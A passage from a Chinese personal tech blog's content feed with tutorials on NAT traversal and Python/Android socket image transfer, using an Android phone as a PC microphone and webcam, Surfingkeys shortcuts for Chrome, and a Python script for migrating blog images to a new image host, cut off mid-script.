</p><p>然后进入控制台。进入域名注册：</p><p><img data-src="https://pic.superbed.cn/item/5cfc9796451253d178e53687.jpg"></p><p><img data-src="https://pic.superbed.cn/item/5cfc9814451253d178e53c32.jpg"></p><p>自己注册一个域名吧，用不了多少钱。</p><p>然后打开内网穿透，新增映射。</p><p><img data-src="https://cy-pic.kuaizhan.com/g3/73/28/ed54-5ad8-4b9e-aae1-38bb14fd4a1132"></p><p>填写你的相关信息。</p><p><img data-src="https://cy-pic.kuaizhan.com/g3/ff/3c/1bfb-b4b7-45a5-9763-763a31e99c8758"></p><p>这里再说一下如何查IP。</p><p>方法一：如果使用了路由器，可以打开路由器查：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1SV79b8Kw3KVjSZFOq6yrDVXaB.jpg"></p><p>方法二：直连网线或wifi的，在cmd窗口用ipconfig命令查看。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1T4Xacbys3KVjSZFnq6xFzpXaK.jpg"></p><p>注意你的连接方式，我是有线所以找的以太网适配器。如果是无线，记得找无线适配器的地址。</p><p>最后下载花生壳的内网穿透客户端到PC上，记得<strong>下载3.0版本</strong>，5.0 beta版经测试还是有bug。</p><p>花生壳3.0 版本：<span class="exturl" data-url="aHR0cHM6Ly9oc2sub3JheS5jb20vZG93bmxvYWQvZG93bmxvYWQ/aWQ9aHNrZGRuc18zMTA=" title="https://hsk.oray.com/download/download?id=hskddns_310">https://hsk.oray.com/download/download?id=hskddns_310<i class="fa fa-external-link"></i></span></p><p><strong>下载好后，安装并登陆打开。</strong></p><h3 id="2-3-测试是否映射成功"><a href="#2-3-测试是否映射成功" class="headerlink" title="2.3 测试是否映射成功"></a>2.3 测试是否映射成功</h3><p>打开在线端口映射工具：<span class="exturl" data-url="aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9wb3J0Lw==" title="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/<i class="fa fa-external-link"></i></span></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1y6XXcbus3KVjSZKbq6xqkFXa7.jpg"></p><p>记住外网的域名和端口，依此填入即可。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1I2g3b25G3KVjSZPxq6zI3XXab.jpg"></p><p>显示“开启”字样，则表示穿透成功。</p><h2 id="3-测试Socket通信"><a href="#3-测试Socket通信" class="headerlink" title="3. 测试Socket通信"></a>3. 测试Socket通信</h2><p>在我的测试中，python作为Socket服务端，Android作为Socket客户端。对应代码如下</p><h3 id="3-1-Socket服务端"><a href="#3-1-Socket服务端" class="headerlink" title="3.1 Socket服务端"></a>3.1 Socket服务端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_service</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    开启socket服务</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 开启socket服务</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.bind((<span class="string">&#x27;192.168.1.104&#x27;</span>, <span class="number">6666</span>))</span><br><span class="line">        s.listen(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">        print(msg)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Wait&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_haze_file</span>(<span class="params">sock</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        从sock中获取数据，并保存下来</span></span><br><span class="line"><span class="string">        :param sock:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> open(haze_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            print(<span class="string">&#x27;file opened&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&#x27;EOF&#x27;</span> <span class="keyword">in</span> str(data):</span><br><span class="line">                    f.write(data[:-len(<span class="string">&#x27;EFO&#x27;</span>)])</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># write data to a file</span></span><br><span class="line">                f.write(data)</span><br><span class="line">        <span class="comment"># sock.close()</span></span><br><span class="line">        print(<span class="string">&#x27;pic received finished&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_img</span>(<span class="params">sock</span>):</span></span><br><span class="line">        <span class="comment"># 发送处理后的图片</span></span><br><span class="line">        <span class="keyword">with</span> open(dehaze_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> data <span class="keyword">in</span> f:</span><br><span class="line">                sock.send(data)</span><br><span class="line">        print(<span class="string">&#x27;send finished&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待连接并处理</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock, _ = s.accept()</span><br><span class="line">        <span class="comment"># idx += 1</span></span><br><span class="line">        <span class="comment"># if idx == 1:</span></span><br><span class="line">        <span class="comment">#     save_haze_file(sock)</span></span><br><span class="line">        <span class="comment"># elif idx == 2:</span></span><br><span class="line">        <span class="comment">#     idx = 0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            save_haze_file(sock)</span><br><span class="line">            dehaze()</span><br><span class="line">            send_img(sock)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">            print(reason)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            sock.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码，就是建立Socket服务端，服务端的IP为内网IP。</p><h3 id="3-2-Socket客户端"><a href="#3-2-Socket客户端" class="headerlink" title="3.2 Socket客户端"></a>3.2 Socket客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">final</span> String IP = <span class="string">&quot;xxx&quot;</span>;<span class="comment">// 这个地方的IP为内网穿透时给的ip</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> PORT= xxx;<span class="comment">// 同理为给的端口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendImg</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个Socket对象，并指定服务端的IP及端口号</span></span><br><span class="line">    socket = <span class="keyword">new</span> Socket(IP, PORT);</span><br><span class="line">    InputStream inputStream = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line">    <span class="comment">// 获取Socket的OutputStream对象用于发送数据。</span></span><br><span class="line">    OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">    <span class="comment">// 创建一个byte类型的buffer字节数组，用于存放读取的本地文件</span></span><br><span class="line">    <span class="keyword">byte</span> buffer[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">10</span> * <span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环读取文件</span></span><br><span class="line">    <span class="keyword">while</span> ((temp = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 把数据写入到OuputStream对象中</span></span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, temp);</span><br><span class="line">        <span class="comment">// 发送读取的数据到服务端</span></span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    socket.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意要修改的地址为IP和PORT。</p><p>查看方式如下：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1W7M3b4iH3KVjSZPfq6xBiVXay.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1KzSeXvBj_uVjSZFpq6A0SXXaS.jpg"></p><p><strong>红框表明的即为需要修改的IP，端口为“映射”字段后写的端口。</strong></p><h2 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h2><p>至此，已经实现了内网穿透并且通过Socket通信了。其余应用功能只用映射为其它端口即可。</p><p>本文涉及的所有代码已放于GIthub:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L0RlQmx1ckdhblRvRGVoYXpl" title="https://github.com/ravenxrz/DeBlurGanToDehaze">https://github.com/ravenxrz/DeBlurGanToDehaze<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Socket </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Android手机作PC的麦克风和摄像头</title>
      <link href="/archives/fc472545.html"/>
      <url>/archives/fc472545.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-麦克风"><a href="#1-麦克风" class="headerlink" title="1.麦克风"></a>1.麦克风</h2><p>要使用Android手机作PC的麦克风，需要在PC和手机上都下载<span class="exturl" data-url="aHR0cDovL3d3dy53aXJlbGVzc29yYW5nZS5jb20vd29taWM=" title="http://www.wirelessorange.com/womic">WO Mic<i class="fa fa-external-link"></i></span>.</p><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy53aXJlbGVzc29yYW5nZS5jb20vd29taWMvc29mdHdhcmVzL2FwcC1yZWxlYXNlLmFwaw==" title="http://www.wirelessorange.com/womic/softwares/app-release.apk">Android APK<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy53aXJlbGVzc29yYW5nZS5jb20vd29taWMvc29mdHdhcmVzL3dvX21pY19jbGllbnRfc2V0dXAuZXhl" title="http://www.wirelessorange.com/womic/softwares/wo_mic_client_setup.exe">Windows WO Mic client program<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy53aXJlbGVzc29yYW5nZS5jb20vd29taWMvc29mdHdhcmVzL3dvX21pY19kcml2ZXJfc2lnbmVkLmV4ZQ==" title="http://www.wirelessorange.com/womic/softwares/wo_mic_driver_signed.exe">Windows WO Mic virtual device driver<i class="fa fa-external-link"></i></span><a id="more"></a><h3 id="1-1-选择传输模式"><a href="#1-1-选择传输模式" class="headerlink" title="1.1 选择传输模式"></a>1.1 选择传输模式</h3>注意必须安装虚拟驱动，才能使用。</li></ul><p>使用WO Mic，PC和Android之间通信的方式有一下3种:</p><ul><li>USB模式</li><li>WIFI模式</li><li>Bluetooth模式<br>看个人方便自行选择。</li></ul><h3 id="1-2-开启手机服务端"><a href="#1-2-开启手机服务端" class="headerlink" title="1.2 开启手机服务端"></a>1.2 开启手机服务端</h3><ol><li>打开Wo Mic App</li><li>在Settings中选择所要使用的传输模式。</li><li>回到主界面点击start即可。</li></ol><p><em>注意可能需要给予一些权限</em></p><h3 id="1-3-在PC端连接手机"><a href="#1-3-在PC端连接手机" class="headerlink" title="1.3 在PC端连接手机"></a>1.3 在PC端连接手机</h3><ol><li>打开WO Mic Client</li><li>选择相应的传输模式，如果选择的是wifi模式，需要填写IP地址</li><li>连接即可。</li></ol><p><strong>Linux版本可参考:<span class="exturl" data-url="aHR0cDovL3d3dy53aXJlbGVzc29yYW5nZS5jb20vd29taWMvd29fbWljX2xpbnV4Lmh0bWwjZGl2X29wZXJhdGlvbnM=" title="http://www.wirelessorange.com/womic/wo_mic_linux.html#div_operations">http://www.wirelessorange.com/womic/wo_mic_linux.html#div_operations<i class="fa fa-external-link"></i></span></strong></p><h2 id="2-摄像头"><a href="#2-摄像头" class="headerlink" title="2.摄像头"></a>2.摄像头</h2><p>同样也需要使用一款软件–<span class="exturl" data-url="aHR0cDovL3d3dy5kZXY0N2FwcHMuY29tLw==" title="http://www.dev47apps.com/">DroidCam<i class="fa fa-external-link"></i></span><br>支持Windows和Linux平台。<br><img data-src="https://ae01.alicdn.com/kf/HTB19AxgXAT2gK0jSZFkq6AIQFXaM.jpg"></p><h3 id="2-1-安装Android-APP"><a href="#2-1-安装Android-APP" class="headerlink" title="2.1 安装Android APP"></a>2.1 安装Android APP</h3><p>APP地址: <span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVNtSmZReE8wWlZvNXlqZUI0Z0wwWHcjbGlzdC9wYXRoPSUyRg==" title="https://pan.baidu.com/s/1SmJfQxO0ZVo5yjeB4gL0Xw#list/path=%2F">https://pan.baidu.com/s/1SmJfQxO0ZVo5yjeB4gL0Xw#list/path=%2F<i class="fa fa-external-link"></i></span><br> 密码：7fp3</p><h3 id="2-2-PC端安装对应Client软件"><a href="#2-2-PC端安装对应Client软件" class="headerlink" title="2.2 PC端安装对应Client软件"></a>2.2 PC端安装对应Client软件</h3><p>由于Win只用安装一个软件，比较简单这里就不说具体怎么安装了。现在说说linux如何安装:<br>首先贴出官网的教程地址:<span class="exturl" data-url="aHR0cDovL3d3dy5kZXY0N2FwcHMuY29tL2Ryb2lkY2FtL2xpbnV4eA==" title="http://www.dev47apps.com/droidcam/linuxx">http://www.dev47apps.com/droidcam/linuxx<i class="fa fa-external-link"></i></span></p><p>按顺序执行以下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">sudo apt-get install linux-headers-&#96;uname -r&#96;</span><br><span class="line">tar xjf droidcam-$&#123;bits&#125;bit.tar.bz2</span><br><span class="line">cd droidcam-$&#123;bits&#125;bit&#x2F;</span><br><span class="line">sudo .&#x2F;install</span><br></pre></td></tr></table></figure><h3 id="2-3-测试"><a href="#2-3-测试" class="headerlink" title="2.3 测试"></a>2.3 测试</h3><p>在命令行中执行<code>droidcam</code>,打开droidcam程序。</p><p>为测试是否有效，需要下载一个视频播放软件，这里推荐使用VLC Player，安装命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vlc</span><br></pre></td></tr></table></figure><p>打开vlc播放器后，选择Media-&gt;Open Capture Device,点击Play即可。</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄像头 </tag>
            
            <tag> 麦克风 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Chrome中使用vim-Surfingkeys使用教程</title>
      <link href="/archives/bcb78a81.html"/>
      <url>/archives/bcb78a81.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>相信使用过Linux操作系统的同学，都或多或多或少使用过vim，vim的最大特点就是可以使我们从鼠标中解救出来，仅用键盘即可完成一切码字工作。另一方面，浏览器作为我们日常生活中使用得最为频繁的软件之一，我们可不可以不使用鼠标禁用键盘来操作浏览器呢？</p></blockquote><p>今天就给大家推荐一款Chrome插件，让我们从鼠标中解放出来。</p><ul><li>Surfingkeys，下载地址放于文末。</li></ul><p><em>其实这类插件还有好几个，但是个人体验后，Surfingkeys是最为完善的一个</em></p><a id="more"></a><h3 id="Surfingkeys简介"><a href="#Surfingkeys简介" class="headerlink" title="Surfingkeys简介"></a>Surfingkeys简介</h3><blockquote><p>Rich shortcuts to click links/switch tabs/scroll pages or capture full page, use Chrome like vim for productivity.</p></blockquote><p>在Chrome中使用vim，提供大量的快捷键来满足浏览要求。</p><p>额外插一句：</p><blockquote><p>估计很多人看到要记大量的快捷键就劝退了，其实这些快捷键基本上都是vim中有的，如果你长期使用vim，根本不需要记多少。对于不使用vim的朋友，我觉得还是有必要尝试一下vim的，只要熬过最开始的陡峭学习曲线，后面就很nice了。更何况各类IDE都提供了vim插件，就不用说什么有IDE干嘛要学vim咯。</p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>先上一张总图，安装Surfingkeys后，按？键打开：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1EqVjXAY2gK0jSZFgq6A5OFXa2.jpg"></p><p>恩，确实有很多，不过肯定不是全都要记咯，我抽几个最常用的来介绍：</p><h4 id="1-界面移动"><a href="#1-界面移动" class="headerlink" title="1.界面移动"></a>1.界面移动</h4><p>左下上右分别对应: h j k l</p><p>下一页：d</p><p>上一页： e 或者 u</p><p>回到顶部： gg</p><p>回到底部： G</p><h4 id="2-打开标签"><a href="#2-打开标签" class="headerlink" title="2. 打开标签"></a>2. 打开标签</h4><p>在当前窗口打开: f</p><p>在新窗口打开: af</p><p>按下f后，会给每个可点击的链接分别编号，再按一次对应编号即可打开对应网页。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB12lNgXqL7gK0jSZFBq6xZZpXat.jpg"></p><h4 id="3-标签页相关"><a href="#3-标签页相关" class="headerlink" title="3. 标签页相关"></a>3. 标签页相关</h4><p>切换到左边标签页： shift+E</p><p>切换到右边标签页: shift + R</p><h4 id="4-网页浏览"><a href="#4-网页浏览" class="headerlink" title="4. 网页浏览"></a>4. 网页浏览</h4><p>刷新: r</p><p>回退: S</p><p>前进: R</p><p>关闭当前页：x</p><p>重新打开上一个关闭的页面:X</p><p>网页放大:zi</p><p>网页缩小:zo</p><p>重置缩放比例:zr</p><h4 id="5-网页选择与选择"><a href="#5-网页选择与选择" class="headerlink" title="5. 网页选择与选择"></a>5. 网页选择与选择</h4><p>将光标集中在网页的第一个输入框：gi</p><p>选择文本核心键：v</p><p>按第一次v，用于模糊定位。按第二次v进入选择文本模式，选择好后按y复制。 说着麻烦，自己使用一次就知道还是很方便的。</p><p>复制当前url: yy</p><p>搜索: /</p><h4 id="6-一些dialog"><a href="#6-一些dialog" class="headerlink" title="6. 一些dialog"></a>6. 一些dialog</h4><p>网页搜索：</p><ul><li>ob: 使用百度搜索</li><li>og: 使用google搜索</li></ul><p>打开书签栏: b</p><p>历史栏: oh</p><p>输入新url: t</p><h4 id="7-长截图"><a href="#7-长截图" class="headerlink" title="7. 长截图"></a>7. 长截图</h4><p>一些没找到好的长截图软件，没想到它自带了。</p><p>yG或者yS。</p><p><strong>对于不确定的命令，可以？打开查看，如果记得组合键的第一个键位，输入等待一会，会自动弹出可选择的键位提示。</strong></p><p>[hide]<br>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUVKSnVCdjhSRmNoZ29tVzcxTV8xblE=" title="https://pan.baidu.com/s/1EJJuBv8RFchgomW71M_1nQ">https://pan.baidu.com/s/1EJJuBv8RFchgomW71M_1nQ<i class="fa fa-external-link"></i></span><br>提取码：wn75<br>[/hide]</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
            <tag> surfingkeys </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>201966-更换图床日志</title>
      <link href="/archives/d7efd3d0.html"/>
      <url>/archives/d7efd3d0.html</url>
      
        <content type="html"><![CDATA[<p>自从微博图床挂了后，就迁移到了Github上，但是Github的速度实在太慢，今天尝试了下腾讯OSS，免费送了6个月的存储，之后的收费也还是可接受范围内。所以就迁移到腾讯咯。</p><h2 id="2019-6-8-Update"><a href="#2019-6-8-Update" class="headerlink" title="2019/6/8 Update"></a>2019/6/8 Update</h2><p>没想到时隔两天，我又更换了图床，在评论区的“游客”建议下，我更换到了聚合图床（毕竟免费，虽然腾讯COS已经很便宜了），目前效果一样不错。</p><p>但是，我已经经历过两次图床迁移的痛苦了。picgo-migrate图床迁移插件还不够完善，有时候还不如我自己手动迁移。所以我觉得，自己动手撸一个迁移脚本。但是因为是赶制版本，所以肯定很简陋了。<br>同时只适合迁移到聚合图床上。</p><p>下面就来说一下怎么用脚本迁移吧。</p><a id="more"></a><h2 id="1-从typecho中导出你的Markdown文章"><a href="#1-从typecho中导出你的Markdown文章" class="headerlink" title="1. 从typecho中导出你的Markdown文章"></a>1. 从typecho中导出你的Markdown文章</h2><p>参考:<span class="exturl" data-url="aHR0cDovL2p1Lm91dG9mbWVtb3J5LmNuL2VudHJ5LzMwNDI3NyVFRiVCQyU4QyVFOCVBRiVCNCVFNSVCRSU5NyVFNSVCRSU4OCVFOCVBRiVBNiVFNyVCQiU4NiVFNCVCQSU4NiVFRiVCQyU4QyVFOCVCRiU5OSVFOSU4NyU4QyVFNSVCMCVCMSVFNCVCOCU4RCVFOSU4NyU4RCVFNSVBNCU4RCVFOCVBRiVCNCVFNiU5OCU4RSVFMyU4MCU4Mg==" title="http://ju.outofmemory.cn/entry/304277%EF%BC%8C%E8%AF%B4%E5%BE%97%E5%BE%88%E8%AF%A6%E7%BB%86%E4%BA%86%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E4%B8%8D%E9%87%8D%E5%A4%8D%E8%AF%B4%E6%98%8E%E3%80%82">http://ju.outofmemory.cn/entry/304277，说得很详细了，这里就不重复说明。<i class="fa fa-external-link"></i></span></p><h2 id="2-获取聚合图床的API"><a href="#2-获取聚合图床的API" class="headerlink" title="2. 获取聚合图床的API"></a>2. 获取聚合图床的API</h2><p>注册聚合图床：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc3VwZXJiZWQuY24v" title="https://www.superbed.cn/">https://www.superbed.cn<i class="fa fa-external-link"></i></span>，然后申请一天的免费会员，就可以获取api的token了。</p><p>如图：</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb231451253d178d99557.jpg"></p><h2 id="3-编写迁移脚本"><a href="#3-编写迁移脚本" class="headerlink" title="3. 编写迁移脚本"></a>3. 编写迁移脚本</h2><p>先给出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">migrate_single_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="comment"># step 1 读入content</span></span><br><span class="line">    <span class="keyword">with</span> open(file_path,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 下行根据自己需要删除，我在使用typecho2md时，多了的字符串</span></span><br><span class="line">    file_content = file_content.replace(<span class="string">r&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step2 通过捕获组获取所有图片链接</span></span><br><span class="line">    pattern = <span class="string">r&#x27;!\[.*\]\((https://typecho-blog.*?)\)&#x27;</span></span><br><span class="line">    img_urls = re.findall(pattern,file_content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个列表用来装新的url，即新上传到的图床的url</span></span><br><span class="line">    new_img_ulrs = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置上传json</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.superbed.cn/upload&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;xxxx&#x27;</span>,<span class="comment"># 写你的token</span></span><br><span class="line">            <span class="string">&#x27;sync&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;v&#x27;</span>:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step3 循环上传</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">            data[<span class="string">&#x27;src&#x27;</span>] = img_url</span><br><span class="line">            r = requests.post(url, data)</span><br><span class="line">            result = json.loads(r.text)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;err&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">                new_img_ulrs.append(result[<span class="string">&#x27;url&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># step4 替换url</span></span><br><span class="line">    <span class="keyword">for</span> idx,url <span class="keyword">in</span> enumerate(img_urls):</span><br><span class="line">        file_content = file_content.replace(url,new_img_ulrs[idx])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print 替换后的结果</span></span><br><span class="line">    print(file_content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重新写入</span></span><br><span class="line">    dir = os.path.dirname(file_path)</span><br><span class="line">    base_name = os.path.basename(file_path).replace(<span class="string">r&quot;.md&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_file_name = os.path.join(dir,base_name+<span class="string">&#x27;_new.md&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(new_file_name,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(file_content)</span><br><span class="line">        </span><br><span class="line"> <span class="comment"># 需要迁移的目录</span></span><br><span class="line">DIR = <span class="string">r&#x27;C:\Users\Raven\Desktop\blog\blog&#x27;</span></span><br><span class="line"><span class="comment"># 找到所有md文件</span></span><br><span class="line">pattern = <span class="string">&#x27;*.md&#x27;</span></span><br><span class="line">files = glob.glob(os.path.join(DIR,pattern))</span><br><span 